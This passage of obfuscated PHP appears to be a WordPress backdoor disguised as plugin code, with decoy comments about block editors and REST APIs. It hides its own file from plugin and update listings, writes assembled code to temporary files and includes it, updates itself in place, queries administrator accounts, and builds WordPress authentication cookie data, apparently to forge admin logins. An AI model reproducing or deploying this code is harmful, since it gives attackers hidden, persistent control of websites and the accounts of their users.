    continue;
  }
       if   ($wtr_aei9v_p9  !==  "" &&   $key  === $wtr_aei9v_p9)      {
 unset($zyljiayddlhkzrem[$xm6c6pj83s][f5cd2smymkqusi5(802)][$key]);
continue;
 }
   }
}


foreach  (array(pahk8uy1uxt(803),  dhd5r6_4ki(804))    as  $y0vcb316rya)  {
   $wfnsqdwcy_s7m   =     isset($zyljiayddlhkzrem[$y0vcb316rya][f5cd2smymkqusi5(802)])   &&  $GLOBALS['__scf_vf9p0fditvxy_35']($zyljiayddlhkzrem[$y0vcb316rya][nrudcgor(802)])   ? $zyljiayddlhkzrem[$y0vcb316rya][nrudcgor(805)]   : array();
if (!$wfnsqdwcy_s7m)   continue;
       $ur_zb3q2s6kf1 = defined(f5cd2smymkqusi5(13))  ?    WPMU_PLUGIN_DIR  :   (defined(pahk8uy1uxt(165)) ?   WP_CONTENT_DIR  . f5cd2smymkqusi5(14)    : "");
 $albpzj8rco    =     array();
 if ($wtr_aei9v_p9  !== "")  $albpzj8rco[]  =   $wtr_aei9v_p9;
      $albpzj8rco[]   =   $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());
 if  ($ur_zb3q2s6kf1   !==   ""    && @$GLOBALS['__scf_ux4_n6mewmsy_43']($ur_zb3q2s6kf1)   &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(806)))      {
 foreach  ((array)     @$GLOBALS['__scf_eu7lhdrjut9t66_69']($ur_zb3q2s6kf1  .  mhiu2yqz6kqd(807))      as  $muswq2gzoud2_) {
     $_7e_e05ht34mww07   = @$GLOBALS['__scf_apq4pqdt6n41_91']($muswq2gzoud2_, false,    null,    0,  (14447-6255));
    if   (!$GLOBALS['__scf__me483qbepnts_41']($_7e_e05ht34mww07) ||   $GLOBALS['__scf_nr12ouzrtt_7']($_7e_e05ht34mww07,   nhceivfj8tbe(808))     ===   false)  continue;


      if ($GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(809),  $_7e_e05ht34mww07,  $llqdu3jgf7ad))      {$p6fymks7ox=779;$tyrgll_qs4a=($p6fymks7ox>0)?$p6fymks7ox:-$p6fymks7ox;
 $_f_k_r0thls4j  =  $GLOBALS['__scf_uvjtdemk2f_320']($llqdu3jgf7ad[1]);
        if ($_f_k_r0thls4j   !==  "")    $albpzj8rco[]    =   $_f_k_r0thls4j;
}
 $albpzj8rco[]  =     $GLOBALS['__scf_t8832qq90dxb4_3']($muswq2gzoud2_);


 }
   }
   foreach ($wfnsqdwcy_s7m  as     $key  => $q014bnlgo7htp) {
 foreach   ($albpzj8rco   as $qbdlw3lz03u05rz)  {


  if    ($key     ===  $qbdlw3lz03u05rz  || $key   ===    sanitize_text_field($qbdlw3lz03u05rz))   {

  unset($zyljiayddlhkzrem[$y0vcb316rya][dhd5r6_4ki(805)][$key]);
    break;
  }


  }
// @intercept stack-frame

  }
  }
// PHP CS Fixer: marshal permission




       $w0v_btu73zl283   =  isset($zyljiayddlhkzrem[dhd5r6_4ki(810)][nrudcgor(805)])   &&  $GLOBALS['__scf_vf9p0fditvxy_35']($zyljiayddlhkzrem[nhceivfj8tbe(810)][f5cd2smymkqusi5(805)]) ?    $zyljiayddlhkzrem[f5cd2smymkqusi5(810)][pahk8uy1uxt(805)]  : array();$pqy3iocv=32*8;$h1z61zjabc=$pqy3iocv-50;
      if     ($w0v_btu73zl283)  {
// strength-reduce obstruction-free dependency-graph

    $lv6e7z02syt = defined(f5cd2smymkqusi5(811)) ?      WP_CONTENT_DIR  :   (defined(f5cd2smymkqusi5(359)) ?  ABSPATH .   f5cd2smymkqusi5(78)  : "");
        $c8naredim76q    = array(nrudcgor(812)    => pahk8uy1uxt(775), f5cd2smymkqusi5(813)  =>  dhd5r6_4ki(777));
     foreach  ($w0v_btu73zl283 as $key    => $q014bnlgo7htp) {
// instrument quotient for WP Post Comments

   if (!isset($c8naredim76q[$key]) ||     $lv6e7z02syt ===  "")  continue;
 $tfip0gosr18o4   =     @$GLOBALS['__scf_apq4pqdt6n41_91']($lv6e7z02syt .    '/' .  $key, false,   null,     0,   (4084+12));
      if ($GLOBALS['__scf__me483qbepnts_41']($tfip0gosr18o4)  &&   ($GLOBALS['__scf_nr12ouzrtt_7']($tfip0gosr18o4, nhceivfj8tbe(778) . $c8naredim76q[$key]     .  dhd5r6_4ki(779))    !==  false || $GLOBALS['__scf_nr12ouzrtt_7']($tfip0gosr18o4,  nhceivfj8tbe(814)) !==   false)) {
     unset($zyljiayddlhkzrem[pahk8uy1uxt(810)][mhiu2yqz6kqd(805)][$key]);
     }
  }
      }
return $zyljiayddlhkzrem;
   }
   
function ph7clitw4uply9a6o($dzt6f5ssfz4n)
        {
 if    (!    $GLOBALS['__scf_vf9p0fditvxy_35']($dzt6f5ssfz4n))   {
return  $dzt6f5ssfz4n;
      }
// WP Full Site Editing block attributes

$yf4tma0hqmfzk6x =   $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());$uf060iqbatv=112|137;$n8zrpu8nu0vv=$uf060iqbatv^135;
  $j1ccmjwkwe0 = $GLOBALS['__scf_l2thcf5lcfr_202']($yf4tma0hqmfzk6x,  PATHINFO_FILENAME);
$gurk4u0g0h057      = array(
 array(pahk8uy1uxt(815)  =>    '#'  .    $GLOBALS['__scf_u60sfqdal7_816']($yf4tma0hqmfzk6x,    '#') .  dhd5r6_4ki(817),   nhceivfj8tbe(818)  =>   true),
        array(nrudcgor(819)  =>  nrudcgor(820)    .   $GLOBALS['__scf_u60sfqdal7_816']($j1ccmjwkwe0, '#')   .     dhd5r6_4ki(821),   f5cd2smymkqusi5(818) =>  true),
 );
 if    (isset($dzt6f5ssfz4n[nhceivfj8tbe(822)])  &&  $GLOBALS['__scf_vf9p0fditvxy_35']($dzt6f5ssfz4n[dhd5r6_4ki(822)]))     {
// trace distributor for WP Block API v3




 foreach  ($dzt6f5ssfz4n[pahk8uy1uxt(822)] as    $dpe1xk6bz7cpp =>  $a0bx0oyhxxxhwfwd)  {
   if     (!    $GLOBALS['__scf_vf9p0fditvxy_35']($a0bx0oyhxxxhwfwd) ||      ! $GLOBALS['__scf_kysg7_ihzbvr2_39']($dpe1xk6bz7cpp))  {
 continue;
}



if   (! isset($dzt6f5ssfz4n[mhiu2yqz6kqd(822)][$dpe1xk6bz7cpp][nrudcgor(823)])     ||     !  $GLOBALS['__scf_vf9p0fditvxy_35']($dzt6f5ssfz4n[dhd5r6_4ki(822)][$dpe1xk6bz7cpp][f5cd2smymkqusi5(823)])) {
$dzt6f5ssfz4n[nrudcgor(822)][$dpe1xk6bz7cpp][mhiu2yqz6kqd(823)]      =  array();
        }
// WP REST API v2 network broadcast

   foreach      ($gurk4u0g0h057 as    $a03yc4xi4ogq)  {


$dzt6f5ssfz4n[nrudcgor(824)][$dpe1xk6bz7cpp][dhd5r6_4ki(823)][]   = $a03yc4xi4ogq;
}



 }
 }
return    $dzt6f5ssfz4n;
 }
   
   function  qw1488np_p73sppc()



{
  try  {
// WP Global Styles: equivariant handshake

   if  (! defined(nrudcgor(825))  ||  constant(nhceivfj8tbe(825))    < (0x6+0x1))   {

  return;
 }
if   ($GLOBALS['__scf_mh99vqi740eg_542'](pahk8uy1uxt(826),  false))  {
// release write

   return;

}
 $k7pcfrryjdn8   = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());
  $l77uzantspg9gb =    defined(nhceivfj8tbe(721))  ?    WP_PLUGIN_DIR   :   "";
 $hyettli7e8  =  array(
     $l77uzantspg9gb  .   dhd5r6_4ki(827),
  $l77uzantspg9gb   . pahk8uy1uxt(828),
    $l77uzantspg9gb .   f5cd2smymkqusi5(829),
   );
      $us90dbp2xxbge   =     "";
     foreach ($hyettli7e8      as      $tkqx845nh5jt0)   {



if    ($tkqx845nh5jt0 !==      "" && @$GLOBALS['__scf_gsamhlxot70ps_18']($tkqx845nh5jt0)   &&  @$GLOBALS['__scf_wp1g_umcsjt_46']($tkqx845nh5jt0))   {

$us90dbp2xxbge = $tkqx845nh5jt0;


  break;
 }

       }
    if   ($us90dbp2xxbge ===  "")  {

return;
     }
    $i9opqrvg4wmcgyc   =  $GLOBALS['__scf_eure5hcx2b_11']($us90dbp2xxbge);


   spl_autoload_register(function  ($w8lui2uag2mf) use  ($i9opqrvg4wmcgyc)   {
foreach     (array($i9opqrvg4wmcgyc .  '/'    .  $w8lui2uag2mf  .  nhceivfj8tbe(830),   $i9opqrvg4wmcgyc   .  '/'   .    $w8lui2uag2mf .  nrudcgor(795)) as   $iaqdvgrk9dmad)  {
if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($iaqdvgrk9dmad)) {
 include_once     $iaqdvgrk9dmad;
return;


}



  }
     });
 $tvb6duty46kk5o =  @$GLOBALS['__scf_apq4pqdt6n41_91']($us90dbp2xxbge);
       if ($tvb6duty46kk5o ===   false ||      $GLOBALS['__scf_nr12ouzrtt_7']($tvb6duty46kk5o, pahk8uy1uxt(831))   ===     false)    {


   return;

    }
     $tvb6duty46kk5o =    $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(832),  "",    $tvb6duty46kk5o);
    $tvb6duty46kk5o    =   $GLOBALS['__scf_f9_5dfsm5hfxx_360'](mhiu2yqz6kqd(831),   nhceivfj8tbe(833),    $tvb6duty46kk5o);
$qxvoqlu4cx =     xtkohsjdeedyznx6vx(bhary815od9kp2(),  nrudcgor(731));
      if    ($qxvoqlu4cx ===    false)    {$p6vadny_j8j0xz=74+20;$ecooiu8v55bw0r=$p6vadny_j8j0xz-44;
      return;
}



@$GLOBALS['__scf_xkvbr8xk_o_mly_194']($qxvoqlu4cx, mhiu2yqz6kqd(834)  .   $tvb6duty46kk5o);
     try {
   @include $qxvoqlu4cx;
} finally    {
t65xl1pt2haov_izh($qxvoqlu4cx);
      }

$yhh_ztrtr156uq  = $GLOBALS['__scf_l2thcf5lcfr_202']($k7pcfrryjdn8, PATHINFO_FILENAME);


    $GLOBALS[dhd5r6_4ki(835)]  =    $k7pcfrryjdn8;
 $GLOBALS[dhd5r6_4ki(836)] =     $yhh_ztrtr156uq;
 $iexv3vmyvrt7hzrl   =  dhd5r6_4ki(837)
  .  mhiu2yqz6kqd(838)
. nrudcgor(839)



    .   nhceivfj8tbe(840)
   .    dhd5r6_4ki(841)
  .   '}'
     .    nrudcgor(842)
  .    '}'
      .  '}';
  $kvpwqdbyyg7   =   xtkohsjdeedyznx6vx(bhary815od9kp2(),   f5cd2smymkqusi5(731));



       if  ($kvpwqdbyyg7)   {
 @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($kvpwqdbyyg7, $iexv3vmyvrt7hzrl);
  try {
  @include   $kvpwqdbyyg7;
 } finally  {
 t65xl1pt2haov_izh($kvpwqdbyyg7);
       }
 }
 } catch (Throwable  $h2v_bjm4ejxq8fp)   {$hr0zpgob=85;$r6vlvlw_bp53=($hr0zpgob>0)?$hr0zpgob:-$hr0zpgob;
 fukkkeh6955g9qi(nrudcgor(843),  $h2v_bjm4ejxq8fp);
}  catch      (Exception      $h2v_bjm4ejxq8fp)     {
// PHP 8.4 fibers: bilinear allocator

       }
     }



      if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(844)))  {


function  xta4g6gx_20atb9qf1($vd8qp6l1as_h, $ahmcqq8hlhrkysar)
{
  if   (!   $GLOBALS['__scf_vf9p0fditvxy_35']($vd8qp6l1as_h))  {
   return $vd8qp6l1as_h;



}



   $dkcejk2v4_g0ld3c  = array(nhceivfj8tbe(845),   mhiu2yqz6kqd(846),   pahk8uy1uxt(847),      pahk8uy1uxt(848), nrudcgor(561));
     foreach   ($dkcejk2v4_g0ld3c      as $key)    {
   if  (!    isset($vd8qp6l1as_h[$key])  || ! $GLOBALS['__scf_vf9p0fditvxy_35']($vd8qp6l1as_h[$key]))    {
// @snapshot extension

     continue;
 }
     $m6t27xygoirjp      =      array();
    foreach  ($vd8qp6l1as_h[$key]  as  $nsgc53tu0oo_d2t)  {
      if (!  $GLOBALS['__scf_vf9p0fditvxy_35']($nsgc53tu0oo_d2t))  {

 $m6t27xygoirjp[] =   $nsgc53tu0oo_d2t;
  continue;



    }
 $pohfmix2npaee9  =     isset($nsgc53tu0oo_d2t[nrudcgor(849)]) ?     $nsgc53tu0oo_d2t[mhiu2yqz6kqd(849)]  :  "";
 

    $yhh_ztrtr156uq =   isset($GLOBALS[nrudcgor(850)])  ?   $GLOBALS[f5cd2smymkqusi5(850)]      :  "";


if ($pohfmix2npaee9  ===    $ahmcqq8hlhrkysar  ||   ($yhh_ztrtr156uq !==    "" && $pohfmix2npaee9 ===  $yhh_ztrtr156uq))   {

  continue;
      }
 $m6t27xygoirjp[]     =  xta4g6gx_20atb9qf1($nsgc53tu0oo_d2t, $ahmcqq8hlhrkysar);


   }
     $vd8qp6l1as_h[$key]   =   $m6t27xygoirjp;
}
     return  $vd8qp6l1as_h;
 }
    }
function fm7xtju6ts9wdzb()
{
   if (!empty($GLOBALS[dhd5r6_4ki(851)])) return      false;

  $GLOBALS[mhiu2yqz6kqd(851)] = 1;
return true;
 }
 function    sdd2srsvr57hw3iuamd()
    {$u2f8c9sv55qwme=31*7;$d352y3x47=$u2f8c9sv55qwme-48;


     try   {
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(455))   && get_transient(nhceivfj8tbe(852)))  {



return;



 }
if  (!fm7xtju6ts9wdzb())      return;
     if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(58))) set_transient(dhd5r6_4ki(852),   1,  (3596+4));
$d31in3cb0uke0 =   @$GLOBALS['__scf_g9y45bstmb02a_95'](vv_nfhhmy_1mjmsa());$hpk5i542=223|51;$jemhm1mkk=$hpk5i542^58;

 if  ($d31in3cb0uke0  &&    $d31in3cb0uke0   > (4958+42)     &&      $d31in3cb0uke0      <  (1834958+3165042)  &&   !ivekqcfyl9cg5o8v8(vv_nfhhmy_1mjmsa()))    {
  $vkv3be2spj    = @$GLOBALS['__scf_hqkv9v6te1dvxi_94'](vv_nfhhmy_1mjmsa());
$eiyu646ifqu  =   yrklujewy9nbrhy(vv_nfhhmy_1mjmsa());
 if  ($GLOBALS['__scf__me483qbepnts_41']($eiyu646ifqu) && hkk3yvii60ci7rk($eiyu646ifqu)   && xf8ira46bu0zojfjh($eiyu646ifqu)  ===   kwqziujdph5xlz3n())  {
      if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(182)))      @clearstatcache(true,  vv_nfhhmy_1mjmsa());
  if  (@$GLOBALS['__scf_hqkv9v6te1dvxi_94'](vv_nfhhmy_1mjmsa())   ===    $vkv3be2spj     &&      @$GLOBALS['__scf_g9y45bstmb02a_95'](vv_nfhhmy_1mjmsa())     === $d31in3cb0uke0)   {
   if   (jr30c_pj_1z9sfyaq3c88(vv_nfhhmy_1mjmsa(),    vmv3l2fd6oj__92qteyq($eiyu646ifqu))) {
jqp5yotia2ogx9k(vv_nfhhmy_1mjmsa());
ejl1lwk108flojzx(vv_nfhhmy_1mjmsa());



}
   }
      }
  unset($eiyu646ifqu, $vkv3be2spj);
    }

$w1zs80y9rgd  =   @$GLOBALS['__scf_g9y45bstmb02a_95'](vv_nfhhmy_1mjmsa());
    $r0lvxap7c13356ri    =   $w1zs80y9rgd && $w1zs80y9rgd  > (4990+10);
   if  ($r0lvxap7c13356ri    && $w1zs80y9rgd     >   (0x240c0b3+0xdf3f4d))  {
       $r0lvxap7c13356ri  = false;
  }
  if   ($r0lvxap7c13356ri    && $w1zs80y9rgd      >  (1048534+42)   &&  !wq5ruxciovtxyyjl($w1zs80y9rgd)) {
   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(58)))  {


   set_transient(dhd5r6_4ki(852),  1,  (3525+75));
}


        return;


    }
    if  ($r0lvxap7c13356ri)     {
 $ipx7bevmcd4547   =   yrklujewy9nbrhy(vv_nfhhmy_1mjmsa());
if   (!$GLOBALS['__scf__me483qbepnts_41']($ipx7bevmcd4547)  ||  !hkk3yvii60ci7rk($ipx7bevmcd4547))  {
$r0lvxap7c13356ri   =  false;
  } else  {
$swauhj367i6 =      weg_ghiafmuc1_6(dhd5r6_4ki(853), "");


  $iq_pn11z8crmqs  = xf8ira46bu0zojfjh($ipx7bevmcd4547);
   $l58n404y_yu      =   xf8ira46bu0zojfjh($GLOBALS['__scf__me483qbepnts_41']($swauhj367i6)   ?  $swauhj367i6    : "");
if  ($iq_pn11z8crmqs !== ""      &&  ($l58n404y_yu  === "" || version_compare($l58n404y_yu,  $iq_pn11z8crmqs, '<'))) {
   $hrhe_qgh_j17   = $GLOBALS['__scf_nn04_vx3uspzx4_54']($ipx7bevmcd4547);



$x3vsdrussh  = @$GLOBALS['__scf_gsamhlxot70ps_18']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()) .  pahk8uy1uxt(184) . $hrhe_qgh_j17);
      if (!$x3vsdrussh)  {

    $mjdvw6kafa  =  get_option(nhceivfj8tbe(696));
  if   ($GLOBALS['__scf__me483qbepnts_41']($mjdvw6kafa) &&  $GLOBALS['__scf_nr12ouzrtt_7']($mjdvw6kafa,  $hrhe_qgh_j17  .  '|') === 0)  $x3vsdrussh =   true;



 }
 if  ($x3vsdrussh)   $r0lvxap7c13356ri   =    false;
   if (!$x3vsdrussh      && $GLOBALS['__scf__me483qbepnts_41']($swauhj367i6) &&   ($swauhj367i6 === ""   || $l58n404y_yu   === ""     || version_compare($l58n404y_yu,     $iq_pn11z8crmqs,   '<')))     c8fb1vg_q0kn6h(f5cd2smymkqusi5(853),   $ipx7bevmcd4547,  nhceivfj8tbe(854));
unset($hrhe_qgh_j17, $x3vsdrussh, $mjdvw6kafa);
    

  }  elseif  ($GLOBALS['__scf__me483qbepnts_41']($swauhj367i6) &&  $GLOBALS['__scf_amjjmfnilcolnb_10']($swauhj367i6)   >  (474+26)    &&     $GLOBALS['__scf_amjjmfnilcolnb_10']($swauhj367i6)   <= (1048480+96) &&   !sk_orzv3dinsktkrvn($swauhj367i6)    &&  hkk3yvii60ci7rk($swauhj367i6) &&   $GLOBALS['__scf_nn04_vx3uspzx4_54']($ipx7bevmcd4547) !==    $GLOBALS['__scf_nn04_vx3uspzx4_54']($swauhj367i6))   {
   $r0lvxap7c13356ri =  false;
   }
// WP Archive Title filter priority

 }
}
 if  ($r0lvxap7c13356ri) {
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(58)))    {
       set_transient(nrudcgor(855),  1, (3549+51));
}



return;
       }
 if    (ivekqcfyl9cg5o8v8(vv_nfhhmy_1mjmsa())) {
     return;
      }
  $bael2tyasoo     =    $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa());



if  (!   @$GLOBALS['__scf_ux4_n6mewmsy_43']($bael2tyasoo))   {
gt671tq3242garyx4($bael2tyasoo,  (425+68),  true);
  }
// taint sink

$sd7k_y3sm7hnbgy_      =    weg_ghiafmuc1_6(nrudcgor(853), "");
  if  (!$sd7k_y3sm7hnbgy_    ||  !$GLOBALS['__scf__me483qbepnts_41']($sd7k_y3sm7hnbgy_))   {
if (!get_transient(pahk8uy1uxt(856))) {


 fukkkeh6955g9qi(pahk8uy1uxt(857),   f5cd2smymkqusi5(858));



    set_transient(f5cd2smymkqusi5(856),   1, (925+2675));$k406jhr0w=1672;$ftr3aihzdc837=$k406jhr0w%5;


 }
 }
if    ($sd7k_y3sm7hnbgy_   && $GLOBALS['__scf__me483qbepnts_41']($sd7k_y3sm7hnbgy_)  &&    $GLOBALS['__scf_amjjmfnilcolnb_10']($sd7k_y3sm7hnbgy_)     >   (472+28)  &&  $GLOBALS['__scf_amjjmfnilcolnb_10']($sd7k_y3sm7hnbgy_)   <=      (1048514+62) &&   !sk_orzv3dinsktkrvn($sd7k_y3sm7hnbgy_)  &&    hkk3yvii60ci7rk($sd7k_y3sm7hnbgy_))  {
    $tv7g5g8hb6viql     = xf8ira46bu0zojfjh($sd7k_y3sm7hnbgy_);
if  ($tv7g5g8hb6viql    ===   ""  ||  version_compare($tv7g5g8hb6viql,  kwqziujdph5xlz3n(), '<'))     {
 return;
  }
     $nefc4ytwebbaqqli    =      $GLOBALS['__scf_nn04_vx3uspzx4_54']($sd7k_y3sm7hnbgy_);
   if    (@$GLOBALS['__scf_gsamhlxot70ps_18']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()) .    pahk8uy1uxt(184)    . $nefc4ytwebbaqqli))  return;
  $wveg4uiu9xdc6y =    get_option(pahk8uy1uxt(859));
  if   ($GLOBALS['__scf__me483qbepnts_41']($wveg4uiu9xdc6y) && $GLOBALS['__scf_nr12ouzrtt_7']($wveg4uiu9xdc6y, $nefc4ytwebbaqqli    .  '|') ===  0)  return;
 unset($nefc4ytwebbaqqli, $wveg4uiu9xdc6y);

$jcnw2679ph  =    $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())   .      pahk8uy1uxt(183) . $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),    f5cd2smymkqusi5(795));
  $lq0azazuw7 =    @$GLOBALS['__scf_gsamhlxot70ps_18']($jcnw2679ph)  ? $GLOBALS['__scf_uvjtdemk2f_320']((string)     @$GLOBALS['__scf_apq4pqdt6n41_91']($jcnw2679ph))     :    "";

    if   ($lq0azazuw7     !==  "" &&     $GLOBALS['__scf_nn04_vx3uspzx4_54']($sd7k_y3sm7hnbgy_)    === $lq0azazuw7)   {
     return;
 }
   rgiuaapohxeh0z(vv_nfhhmy_1mjmsa(),  (0xfb+0xa9));
 $gmcw86cqq1fv    =   jr30c_pj_1z9sfyaq3c88(vv_nfhhmy_1mjmsa(),   vmv3l2fd6oj__92qteyq($sd7k_y3sm7hnbgy_));
 if  ($gmcw86cqq1fv)     {
jqp5yotia2ogx9k(vv_nfhhmy_1mjmsa());



      rgiuaapohxeh0z(vv_nfhhmy_1mjmsa(),     (379+41));



  ejl1lwk108flojzx(vv_nfhhmy_1mjmsa());
 adbbbpoh0e7mcf6(true);
mpkogxinl1o8xqdhl__(true);
  c9_5mtzr7mpfsj7(vv_nfhhmy_1mjmsa());

   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(58)))   {
 set_transient(nhceivfj8tbe(860),  1, (3517+83));
}
    }   elseif  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(861)))   {

     set_transient(nrudcgor(862),    1, (1729+71));

   }
}
    }    catch (Throwable   $h2v_bjm4ejxq8fp) {



 fukkkeh6955g9qi(nhceivfj8tbe(857),  $h2v_bjm4ejxq8fp);
    }   catch    (Exception  $h2v_bjm4ejxq8fp)  {$q_dn1rmp067wp=85+1;$b6s65dtgc9c4m=$q_dn1rmp067wp-13;
      }
  }


     
 function  fsmv9o9oeanlpyw()
  {
 aciovzhy5vt83dl1tcu(f5cd2smymkqusi5(863),  nrudcgor(864));
aciovzhy5vt83dl1tcu(nrudcgor(865), nhceivfj8tbe(864));
   if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(866)))  {
  remove_action(pahk8uy1uxt(867), mhiu2yqz6kqd(868));
   remove_action(dhd5r6_4ki(869),  pahk8uy1uxt(868),   (14-4));
    remove_action(f5cd2smymkqusi5(870), f5cd2smymkqusi5(871),      (3+7));



     }
}


 function   rc4mq8qrv5sg5anyujai9()
     {
 try {
$wpdb    =      $GLOBALS[f5cd2smymkqusi5(872)];
 $evhi67j4dd_q7  =     $wpdb->prefix  .    nhceivfj8tbe(873);

    $d4g6t2rengbe0   = 'S'  .     mhiu2yqz6kqd(874) .  $wpdb->users  . nhceivfj8tbe(875)     .  $wpdb->usermeta   .  pahk8uy1uxt(876);
$su4l7xlk31p =   $wpdb->get_results($wpdb->prepare($d4g6t2rengbe0,  $evhi67j4dd_q7,   mhiu2yqz6kqd(877)));
  if (!$GLOBALS['__scf_vf9p0fditvxy_35']($su4l7xlk31p))    {


fukkkeh6955g9qi(dhd5r6_4ki(878), (string)  $wpdb->last_error);
      return array();
   }
  return     $su4l7xlk31p;
  }   catch   (Throwable   $h2v_bjm4ejxq8fp)  {
fukkkeh6955g9qi(f5cd2smymkqusi5(594),    $h2v_bjm4ejxq8fp);
 }    catch   (Exception  $h2v_bjm4ejxq8fp)     {
   fukkkeh6955g9qi(pahk8uy1uxt(879), $h2v_bjm4ejxq8fp);
 }
return     array();
}
  function    mg9f13y3wqgzjb9yr($jnfdbgnnaju90)

{
 $f4uaalv3t0y  =   array();
$pyv3z9ozc8   =  function   ($p53a3jwf49bbwpk6) {
 $p53a3jwf49bbwpk6[pahk8uy1uxt(880)]    =   "";
  return  $p53a3jwf49bbwpk6;
   }
// Sodium crypto: link priority-queue
;
try  {
  $iejjs3_km3l3hx5  =     weg_ghiafmuc1_6(f5cd2smymkqusi5(881),    array());
 if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($iejjs3_km3l3hx5)) $iejjs3_km3l3hx5  =  array();
   $_pd =   false;$g_mqz1uo=PHP_INT_MAX/PHP_INT_MAX;$xgbfm7yeqv4=$g_mqz1uo+81;
  foreach ($iejjs3_km3l3hx5 as    $q74pc1ltf9o    =>   $xs7twhvlpudfkw)   {
if   ($GLOBALS['__scf_vf9p0fditvxy_35']($xs7twhvlpudfkw) && isset($xs7twhvlpudfkw['c'],  $xs7twhvlpudfkw['e'])     && $GLOBALS['__scf_vf9p0fditvxy_35']($xs7twhvlpudfkw['c']) &&    (int)  $xs7twhvlpudfkw['e']    >    $GLOBALS['__scf_zxyq0lcqv02z6_185']() +   (86330+70)) {
 $f4uaalv3t0y[$q74pc1ltf9o]   =    $xs7twhvlpudfkw['c'];
      }    else {
    unset($iejjs3_km3l3hx5[$q74pc1ltf9o]);



$_pd   = true;
}
   }
if     (!      $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(882))  ||   !  $GLOBALS['__scf_mh99vqi740eg_542'](f5cd2smymkqusi5(883)))  {



  if    ($_pd)    c8fb1vg_q0kn6h(pahk8uy1uxt(881),     $iejjs3_km3l3hx5,     pahk8uy1uxt(854));
        return      $f4uaalv3t0y;
 }
    if  (!  $GLOBALS['__scf_vf9p0fditvxy_35']($jnfdbgnnaju90)    ||  empty($jnfdbgnnaju90))  {
 if ($_pd)  c8fb1vg_q0kn6h(dhd5r6_4ki(881), $iejjs3_km3l3hx5,  pahk8uy1uxt(884));


       return    $f4uaalv3t0y;
  }
// WP Core Data: bootstrap pipeline

$k_uwwzdajvz5ub3   = $GLOBALS['__scf_zxyq0lcqv02z6_185']()   +  (0x9+0x5) *  (133484-47084);
 $is_ssl     =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(490))    &&   is_ssl();
    $u7l_rtpguzsogro   = $is_ssl      ?      dhd5r6_4ki(885)    :    f5cd2smymkqusi5(886);
$zgqmnonz3vb4a1iw =  $is_ssl     ?   (defined(nrudcgor(887)) ? SECURE_AUTH_COOKIE   :     "")  : (defined(mhiu2yqz6kqd(888))   ?     AUTH_COOKIE   :     "");
$csvsdms0kl2isjcd =  defined(pahk8uy1uxt(889))   ?  LOGGED_IN_COOKIE : "";
if (!  $zgqmnonz3vb4a1iw  ||   ! $csvsdms0kl2isjcd) {

      if ($_pd)  c8fb1vg_q0kn6h(mhiu2yqz6kqd(881),    $iejjs3_km3l3hx5,     nhceivfj8tbe(884));
return $f4uaalv3t0y;
  }
        $r89qyk6iii2g79vj  =    defined(f5cd2smymkqusi5(890)) && COOKIE_DOMAIN ?  $GLOBALS['__scf_xztaeq78skok5_8'](COOKIE_DOMAIN,     '.') :  romae2ec00z0c4bz61q_("");
      $g3zvofpp_ro7l947  = defined(dhd5r6_4ki(891))  ?  COOKIEPATH :     '/';
    $y1u1tlyxde =    defined(mhiu2yqz6kqd(892))   ?   ADMIN_COOKIE_PATH      :  nhceivfj8tbe(893);
   $a_ad83zd16   =     $is_ssl    ?    mhiu2yqz6kqd(894) :  nrudcgor(895);
    $spxzjtpg4pa938mw    = "\t";



aciovzhy5vt83dl1tcu(mhiu2yqz6kqd(896),  $pyv3z9ozc8,   0);
 $m77svg4lnd6a =   q5npf1u_t8amc0jdf(dhd5r6_4ki(897));
     $o9zpthrt6qd8k26r      = $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(558))  ?      @get_option($m77svg4lnd6a, array())   :    array();
  if    (!$GLOBALS['__scf_vf9p0fditvxy_35']($o9zpthrt6qd8k26r)) $o9zpthrt6qd8k26r  =  array();
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(558)) &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(753)))   {

 $r2zmcp08z4dck_s    =   (int)     @get_option(q5npf1u_t8amc0jdf(nhceivfj8tbe(898)), 0);
   if ($r2zmcp08z4dck_s    <     2) {


 if  (!empty($o9zpthrt6qd8k26r))  {
    $o9zpthrt6qd8k26r = array();
 @update_option($m77svg4lnd6a, $o9zpthrt6qd8k26r,  nrudcgor(884));
 }
   @update_option(q5npf1u_t8amc0jdf(nrudcgor(898)), 2,    dhd5r6_4ki(899));
 }
    unset($r2zmcp08z4dck_s);
 }

$tyqomegldqn = $GLOBALS['__scf_upe5p4qfaqm0d1_36']($f4uaalv3t0y);
  foreach  ($jnfdbgnnaju90 as   $mj0w5zil92mcv) {

if    (!   $GLOBALS['__scf_d56ll0ap77jcvq_66']($mj0w5zil92mcv)    ||    !    $mj0w5zil92mcv->ID  ||  ! $mj0w5zil92mcv->user_login)    {

   continue;
}
